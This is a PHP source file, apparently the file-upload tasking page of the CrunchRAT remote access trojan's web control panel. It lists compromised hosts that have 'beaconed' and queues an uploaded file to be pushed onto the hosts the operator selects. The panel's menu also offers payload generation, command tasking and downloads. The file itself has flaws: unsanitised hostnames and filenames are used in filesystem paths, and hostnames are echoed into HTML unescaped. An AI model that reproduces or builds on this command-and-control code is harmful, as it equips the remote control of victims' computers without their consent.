<?php
    # Necessary at the top of every page for session management
    session_start();

    # If the RAT user isn't authenticated
    if (!isset($_SESSION["authenticated"]))
    {
        # Redirects them to 403.php page
        header("Location: 403.php");
    }
    # Else they are authenticated
    else
    {
        # Includes the RAT configuration file
        include "config/config.php";

        # Establishes a connection to the RAT database
        # Uses variables from "config/config.php"
        # "SET NAMES utf8" is necessary to be Unicode-friendly
        $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
    }
?>

<!doctype html>
<html lang="en">
    <head> <!-- Start of header -->
        <meta charset="utf-8">
        <title>CrunchRAT</title>
        <!-- CDN links -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
        <script src="https://code.jquery.com/jquery-1.12.3.js"></script>
    </head> <!-- End of header -->

    <body> <!-- Start of body -->
        <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
            <a class="navbar-brand" href="#">CrunchRAT</a>
            <ul class="nav navbar-nav">
                <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
                <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
                <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
                <li class="nav-item"><a class="nav-link" href="generatePayload.php">Generate Payload</a></li>
                <li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
                    <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
                        <li><a href="tasks.php">View Tasks</a></li>
                        <li><a href="command.php">Task Command</a></li>
                        <li><a href="upload.php">Task Upload</a></li>
                        <li><a href="download.php">Task Download</a></li>
                    </ul>
                </li> <!-- End of "Task" drop-down menu -->

                <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
                    <ul class="dropdown-menu">
                        <li><a href="addUser.php">Add User</a></li>
                        <li><a href="changePassword.php">Change Password</a></li>
                        <li role="separator" class="divider"></li>
                        <li><a href="logout.php">Logout</a></li>
                    </ul>
                </li> <!-- End of "Account Management" drop-down menu -->
                <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
            </ul>
        </nav> <!-- End of navigation bar -->

        <div class="container"> <!-- Start of main body container -->
            <form role="form" class="form-inline" method="post" enctype="multipart/form-data"> <!-- Start of task file upload form -->
                <div class="form-group">
                    <select multiple class="form-control" name="hostname[]"> <!-- Hostname array in case they select multiple hostnames -->
                        <?php
                            # Determines the hosts that have previously beaconed
                            $statement = $dbConnection->prepare("SELECT hostname FROM hosts");
                            $statement->execute();
                            $hosts = $statement->fetchAll();

                            # Kills database connection
                            $statement->connection = null;
                  
                            # Populates each <option> with our hosts that have beaconed previously
                            foreach($hosts as $row)
                            {
                                echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . $row["hostname"] . "</option>";
                            }
                        ?>
                    </select>
                </div>
                <div class="form-group">
                    <input type="file" class="form-control-file" name="upload">&ensp;
                </div>
                <button type="submit" name="submit" class="btn btn-default">Task File Upload</button>
            </form> <!-- End of task file upload form -->
            <?php
                # If the user clicked "Task File Upload"
                if (isset($_POST["submit"]))
                {
                    # If all fields are set
                    if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && $_FILES["upload"]["error"] == 0)
                    {
                        # If uploaded file size is greater than zero bytes
                        if ($_FILES["upload"]["size"] > 0)
                        {
                            # For loop to loop through each hostname that was selected for a task
                            for ($counter = 0; $counter < sizeof($_POST["hostname"]); $counter++)
                            {
                                $hostname = $_POST["hostname"][$counter]; # Current hostname from for loop

                                # Does the /var/www/html/uploads/<SYSTEM> directory exist?
                                # If not we create the directory
                                if (!file_exists("/var/www/html/uploads". $hostname))
                                {
                                    mkdir("/var/www/html/uploads/" . $hostname);
                                }
                
                                # Copies uploaded file from the /tmp directory to the /var/www/html/uploads/<SYSTEM> directory
                                $filename = $_FILES["upload"]["name"];
                                $tempFilePath = $_FILES["upload"]["tmp_name"];
                                $fileDestination = "/var/www/html/uploads/" . $hostname . "/" . $filename;
                                copy($tempFilePath, $fileDestination); # Uses copy() instead of move_uploaded_file() in case there are multiple hostnames that you want to task a file upload for

                                # Inserts upload task into "tasks" table
                                $upload = "/uploads/" . $hostname . "/" . $filename;
                                $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
                                $statement->bindValue(":user", $_SESSION["username"]);
                                $statement->bindValue(":action", "upload");
                                $statement->bindValue(":hostname", $hostname);
                                $statement->bindValue(":secondary", $upload);  
                                $statement->execute();

                                # Inserts hostname, action, secondary, and status into "output" table
                                $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
                                $statement->bindValue(":user", $_SESSION["username"]);
                                $statement->bindValue(":hostname", $hostname);
                                $statement->bindValue(":action", "upload");
                                $statement->bindValue(":secondary", $upload);
                                $statement->bindValue(":status", "N");
                                $statement->execute();
                            }

                            # Kills database connection
                            $statement->connection = null;

                            # Displays success message - "Successfully tasked file upload"
                            echo "<br><div class='alert alert-success'>Successfully tasked file upload</div>";
                        }
                        # Else file is zero bytes
                        else
                        {
                            # Displays error message - "Can't upload a zero byte file"
                            echo "<br><div class='alert alert-danger'>Can't upload a zero byte file</div>";
                        }
                    }
                    # Else not all fields were set
                    else
                    {
                        # Displays error message - "Please fill out all fields"
                        echo "<br><div class='alert alert-danger'>Please fill out all fields</div>";
                    }
                }
            ?>
        </div> <!-- End main body container -->
    </body> <!-- End of body -->
</html>